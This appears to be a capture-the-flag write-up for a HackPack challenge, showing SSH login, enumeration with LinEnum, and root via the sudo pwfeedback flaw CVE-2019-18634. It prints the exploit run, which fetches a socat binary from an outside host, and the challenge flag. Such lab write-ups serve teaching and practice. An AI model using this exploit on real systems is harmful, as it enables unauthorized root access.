---
title: "HackPack: Humpty"
categories:
  - HackPack
tags:
  - HackPack
---

We first need to connect to the machine with ssh:

```
ssh -p 41701 humptydumpty@cha.hackpack.club
Password: covfefe
```

Taking a look around the machine doesn't turn up anything obvious. We'll run linenum.sh to get a better idea of what's on the machine (https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh):

```
./linenum.sh

### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.21p2
```

	That piece of information is interesting, as sudo appears to be outdated. Googling an exploit for this version of sudo brings us to https://www.cybersecurity-help.cz/vdb/SB2020013120. Taking a look through this shows us that an exploit is available, so we'll look for an exploit for CVE-2019-18634, which lands us at https://github.com/Plazmaz/CVE-2019-18634/blob/master/self-contained.sh.

Grabbing the exploit, putting it on the victim machine, and running it returns the root user to us!

```
humptydumpty@12dcf5a6cb5a:~$ bash exploit.sh 
--2020-04-23 16:55:57--  https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.248.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.248.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat                         100%[==============================================>] 366.38K  --.-KB/s    in 0.07s   

2020-04-23 16:55:57 (4.84 MB/s) - ‘socat’ saved [375176/375176]


We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Sorry, try again.
Sorry, try again.
root@12dcf5a6cb5a:/home/humptydumpty# exit
sudo: 2 incorrect password attempts
Exploiting!
root@12dcf5a6cb5a:/home/humptydumpty# whoami
root
```

We can now grab the flag:

```
root@12dcf5a6cb5a:/home/humptydumpty# cat flag 
flag{7h3_vu1n!_i5?...CVE_2019-18634!}
```

**flag{7h3_vu1n!_i5?...CVE_2019-18634!}**
